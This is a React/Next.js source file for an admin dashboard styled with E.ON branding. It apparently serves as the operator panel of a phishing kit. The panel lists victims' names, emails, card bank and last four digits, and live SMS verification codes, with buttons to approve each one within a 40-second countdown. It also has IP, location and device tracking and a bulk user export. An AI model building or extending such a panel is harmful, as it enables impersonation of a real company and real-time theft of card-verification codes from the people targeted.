"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { createClient } from "@/lib/supabase/client"

interface VerificationRequest {
  id: string
  user_id: string
  payment_method_id: string
  verification_code: string
  status: string
  requested_at: string
  responded_at: string | null
  ip_address: string
  location_info: any
  browser_info: any
  device_info: any
  profiles: {
    email: string
    full_name: string
  }
  payment_methods: {
    card_brand: string
    card_last_four: string
    bank_name: string
  }
}

interface User {
  id: string
  email: string
  full_name: string
  account_number: string
  created_at: string
  user_activity_log: any[]
}

export default function AdminDashboard({ userId, adminRole }: { userId: string; adminRole: string }) {
  const router = useRouter()
  const supabase = createClient()
  const [activeTab, setActiveTab] = useState<"verification" | "users" | "activity" | "visitors">("verification")
  const [verificationRequests, setVerificationRequests] = useState<VerificationRequest[]>([])
  const [users, setUsers] = useState<User[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [autoDeclineTimers, setAutoDeclineTimers] = useState<Record<string, NodeJS.Timeout>>({})

  useEffect(() => {
    loadData()

    // Set up real-time subscription for verification requests
    const channel = supabase
      .channel("verification_requests")
      .on("postgres_changes", { event: "*", schema: "public", table: "verification_requests" }, () => {
        loadData()
      })
      .subscribe()

    return () => {
      supabase.removeChannel(channel)
      // Clear all timers
      Object.values(autoDeclineTimers).forEach((timer) => clearTimeout(timer))
    }
  }, [])

  useEffect(() => {
    // Set up auto-decline timers for pending requests
    verificationRequests
      .filter((req) => req.status === "pending")
      .forEach((req) => {
        if (!autoDeclineTimers[req.id]) {
          const requestTime = new Date(req.requested_at).getTime()
          const now = Date.now()
          const elapsed = now - requestTime
          const remaining = 40000 - elapsed // 40 seconds

          if (remaining > 0) {
            const timer = setTimeout(() => {
              handleVerificationAction(req.id, "decline", "Auto-declined after 40 seconds")
            }, remaining)

            setAutoDeclineTimers((prev) => ({ ...prev, [req.id]: timer }))
          } else {
            // Already expired, decline immediately
            handleVerificationAction(req.id, "decline", "Auto-declined after 40 seconds")
          }
        }
      })
  }, [verificationRequests])

  const loadData = async () => {
    setIsLoading(true)

    try {
      const [verificationRes, usersRes] = await Promise.all([
        fetch("/api/admin/verification-requests"),
        fetch("/api/admin/users"),
      ])

      const verificationData = await verificationRes.json()
      const usersData = await usersRes.json()

      setVerificationRequests(verificationData.requests || [])
      setUsers(usersData.users || [])
    } catch (error) {
      console.error("[v0] Admin data load error:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleVerificationAction = async (requestId: string, action: "approve" | "decline", notes?: string) => {
    try {
      // Clear timer if exists
      if (autoDeclineTimers[requestId]) {
        clearTimeout(autoDeclineTimers[requestId])
        setAutoDeclineTimers((prev) => {
          const newTimers = { ...prev }
          delete newTimers[requestId]
          return newTimers
        })
      }

      const response = await fetch("/api/admin/verification-requests", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId, action, adminNotes: notes }),
      })

      if (response.ok) {
        loadData()
      }
    } catch (error) {
      console.error("[v0] Verification action error:", error)
    }
  }

  const handleExportUsers = async () => {
    try {
      const response = await fetch("/api/admin/export-users")
      const blob = await response.blob()
      const url = window.URL.createObjectURL(blob)
      const a = document.createElement("a")
      a.href = url
      a.download = `users-export-${new Date().toISOString()}.csv`
      document.body.appendChild(a)
      a.click()
      document.body.removeChild(a)
      window.URL.revokeObjectURL(url)
    } catch (error) {
      console.error("[v0] Export error:", error)
    }
  }

  const handleSignOut = async () => {
    await supabase.auth.signOut()
    router.push("/")
  }

  const getTimeRemaining = (requestedAt: string) => {
    const requestTime = new Date(requestedAt).getTime()
    const now = Date.now()
    const elapsed = now - requestTime
    const remaining = Math.max(0, 40000 - elapsed)
    return Math.ceil(remaining / 1000)
  }

  return (
    <div className="min-h-screen bg-gray-100">
      <header className="bg-white border-b border-gray-200 px-6 py-4">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <div className="flex items-center gap-4">
            <img src="/eon-logo.svg" alt="E.ON Logo" className="h-8" />
            <span className="text-2xl font-bold text-[#E20015]">Admin Dashboard</span>
          </div>
          <div className="flex items-center gap-4">
            <span className="text-sm text-gray-600">Role: {adminRole}</span>
            <button
              onClick={() => router.push("/admin/settings")}
              className="text-sm font-medium text-gray-600 hover:text-[#E20015]"
            >
              Settings
            </button>
            <button onClick={handleSignOut} className="text-sm font-medium text-gray-600 hover:text-[#E20015]">
              Abmelden
            </button>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-6 py-8">
        <div className="flex gap-4 mb-8">
          <button
            onClick={() => setActiveTab("verification")}
            className={`px-6 py-3 rounded-lg font-semibold transition-colors ${
              activeTab === "verification" ? "bg-[#E20015] text-white" : "bg-white text-gray-700 hover:bg-gray-50"
            }`}
          >
            SMS Verification ({verificationRequests.filter((r) => r.status === "pending").length})
          </button>
          <button
            onClick={() => setActiveTab("users")}
            className={`px-6 py-3 rounded-lg font-semibold transition-colors ${
              activeTab === "users" ? "bg-[#E20015] text-white" : "bg-white text-gray-700 hover:bg-gray-50"
            }`}
          >
            Users ({users.length})
          </button>
          <button
            onClick={() => setActiveTab("activity")}
            className={`px-6 py-3 rounded-lg font-semibold transition-colors ${
              activeTab === "activity" ? "bg-[#E20015] text-white" : "bg-white text-gray-700 hover:bg-gray-50"
            }`}
          >
            Activity Log
          </button>
          <button
            onClick={() => router.push("/admin/visitors")}
            className="px-6 py-3 rounded-lg font-semibold bg-white text-gray-700 hover:bg-gray-50 transition-colors"
          >
            Visitor Tracking
          </button>
          <button
            onClick={handleExportUsers}
            className="ml-auto px-6 py-3 rounded-lg font-semibold bg-green-600 text-white hover:bg-green-700 transition-colors"
          >
            Export All Users
          </button>
        </div>

        {activeTab === "verification" && (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold mb-4">SMS Verification Requests</h2>
            {verificationRequests.filter((r) => r.status === "pending").length === 0 ? (
              <div className="bg-white rounded-lg p-8 text-center text-gray-500">No pending verification requests</div>
            ) : (
              verificationRequests
                .filter((r) => r.status === "pending")
                .map((request) => {
                  const timeRemaining = getTimeRemaining(request.requested_at)
                  return (
                    <div key={request.id} className="bg-white rounded-lg p-6 shadow-sm">
                      <div className="flex items-start justify-between mb-4">
                        <div>
                          <h3 className="text-lg font-bold">{request.profiles.full_name}</h3>
                          <p className="text-sm text-gray-600">{request.profiles.email}</p>
                        </div>
                        <div className="text-right">
                          <span
                            className={`inline-block px-3 py-1 rounded-full text-sm font-semibold ${
                              timeRemaining > 20
                                ? "bg-green-100 text-green-800"
                                : timeRemaining > 10
                                  ? "bg-yellow-100 text-yellow-800"
                                  : "bg-red-100 text-red-800"
                            }`}
                          >
                            {timeRemaining}s remaining
                          </span>
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-4 mb-4">
                        <div>
                          <p className="text-sm text-gray-600">Card</p>
                          <p className="font-semibold">
                            {request.payment_methods.bank_name || request.payment_methods.card_brand} ••••{" "}
                            {request.payment_methods.card_last_four}
                          </p>
                        </div>
                        <div>
                          <p className="text-sm text-gray-600">Verification Code</p>
                          <p className="font-mono text-2xl font-bold text-[#E20015]">{request.verification_code}</p>
                        </div>
                        <div>
                          <p className="text-sm text-gray-600">IP Address</p>
                          <p className="font-mono">{request.ip_address}</p>
                        </div>
                        <div>
                          <p className="text-sm text-gray-600">Location</p>
                          <p>
                            {request.location_info?.city}, {request.location_info?.country}
                          </p>
                        </div>
                        <div>
                          <p className="text-sm text-gray-600">Browser</p>
                          <p>
                            {request.browser_info?.name} {request.browser_info?.version}
                          </p>
                        </div>
                        <div>
                          <p className="text-sm text-gray-600">Device</p>
                          <p>
                            {request.device_info?.type} - {request.device_info?.os}
                          </p>
                        </div>
                      </div>

                      <div className="flex gap-3">
                        <button
                          onClick={() => handleVerificationAction(request.id, "approve")}
                          className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-lg transition-colors"
                        >
                          Approve
                        </button>
                        <button
                          onClick={() => handleVerificationAction(request.id, "decline", "Manually declined by admin")}
                          className="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-lg transition-colors"
                        >
                          Decline
                        </button>
                      </div>
                    </div>
                  )
                })
            )}

            <h3 className="text-xl font-bold mt-8 mb-4">Recent Responses</h3>
            {verificationRequests
              .filter((r) => r.status !== "pending")
              .slice(0, 10)
              .map((request) => (
                <div key={request.id} className="bg-white rounded-lg p-4 shadow-sm">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="font-semibold">{request.profiles.full_name}</p>
                      <p className="text-sm text-gray-600">{request.verification_code}</p>
                    </div>
                    <span
                      className={`px-3 py-1 rounded-full text-sm font-semibold ${
                        request.status === "approved" ? "bg-green-100 text-green-800" : "bg-red-100 text-red-800"
                      }`}
                    >
                      {request.status}
                    </span>
                  </div>
                </div>
              ))}
          </div>
        )}

        {activeTab === "users" && (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold mb-4">All Users</h2>
            <div className="bg-white rounded-lg overflow-hidden shadow-sm">
              <table className="w-full">
                <thead className="bg-gray-50">
                  <tr>
                    <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">User</th>
                    <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">Account Number</th>
                    <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">Last Activity</th>
                    <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">Location</th>
                    <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">Risk</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-200">
                  {users.map((user) => {
                    const lastActivity = user.user_activity_log?.[0]
                    return (
                      <tr key={user.id} className="hover:bg-gray-50">
                        <td className="px-6 py-4">
                          <p className="font-semibold">{user.full_name}</p>
                          <p className="text-sm text-gray-600">{user.email}</p>
                        </td>
                        <td className="px-6 py-4 font-mono">{user.account_number}</td>
                        <td className="px-6 py-4">
                          {lastActivity ? (
                            <>
                              <p className="text-sm">{lastActivity.activity_type}</p>
                              <p className="text-xs text-gray-500">
                                {new Date(lastActivity.created_at).toLocaleString("de-DE")}
                              </p>
                            </>
                          ) : (
                            <span className="text-gray-400">No activity</span>
                          )}
                        </td>
                        <td className="px-6 py-4">
                          {lastActivity?.location_info ? (
                            <>
                              <p className="text-sm">{lastActivity.location_info.city}</p>
                              <p className="text-xs text-gray-500">{lastActivity.location_info.country}</p>
                            </>
                          ) : (
                            <span className="text-gray-400">Unknown</span>
                          )}
                        </td>
                        <td className="px-6 py-4">
                          {lastActivity?.flagged ? (
                            <span className="px-2 py-1 rounded-full text-xs font-semibold bg-red-100 text-red-800">
                              High Risk ({lastActivity.risk_score})
                            </span>
                          ) : (
                            <span className="px-2 py-1 rounded-full text-xs font-semibold bg-green-100 text-green-800">
                              Low Risk
                            </span>
                          )}
                        </td>
                      </tr>
                    )
                  })}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {activeTab === "activity" && (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold mb-4">Activity Log</h2>
            {users
              .flatMap((user) =>
                (user.user_activity_log || []).map((activity) => ({
                  ...activity,
                  user_email: user.email,
                  user_name: user.full_name,
                })),
              )
              .sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime())
              .slice(0, 50)
              .map((activity, index) => (
                <div key={index} className="bg-white rounded-lg p-4 shadow-sm">
                  <div className="flex items-start justify-between">
                    <div className="flex-1">
                      <div className="flex items-center gap-3 mb-2">
                        <span className="font-semibold">{activity.user_name}</span>
                        <span className="text-sm text-gray-600">{activity.user_email}</span>
                        <span className="px-2 py-1 rounded-full text-xs font-semibold bg-blue-100 text-blue-800">
                          {activity.activity_type}
                        </span>
                      </div>
                      <div className="grid grid-cols-4 gap-4 text-sm">
                        <div>
                          <p className="text-gray-600">IP Address</p>
                          <p className="font-mono">{activity.ip_address}</p>
                        </div>
                        <div>
                          <p className="text-gray-600">Location</p>
                          <p>
                            {activity.location_info?.city}, {activity.location_info?.country}
                          </p>
                        </div>
                        <div>
                          <p className="text-gray-600">Browser</p>
                          <p>{activity.browser_info?.name}</p>
                        </div>
                        <div>
                          <p className="text-gray-600">Device</p>
                          <p>{activity.device_info?.type}</p>
                        </div>
                      </div>
                    </div>
                    <div className="text-right">
                      <p className="text-sm text-gray-600">{new Date(activity.created_at).toLocaleString("de-DE")}</p>
                      {activity.flagged && (
                        <span className="inline-block mt-2 px-2 py-1 rounded-full text-xs font-semibold bg-red-100 text-red-800">
                          Flagged (Risk: {activity.risk_score})
                        </span>
                      )}
                    </div>
                  </div>
                </div>
              ))}
          </div>
        )}

        {activeTab === "visitors" && (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold mb-4">Visitor Tracking</h2>
            <p className="text-gray-600">This section will display visitor tracking data.</p>
          </div>
        )}
      </main>
    </div>
  )
}
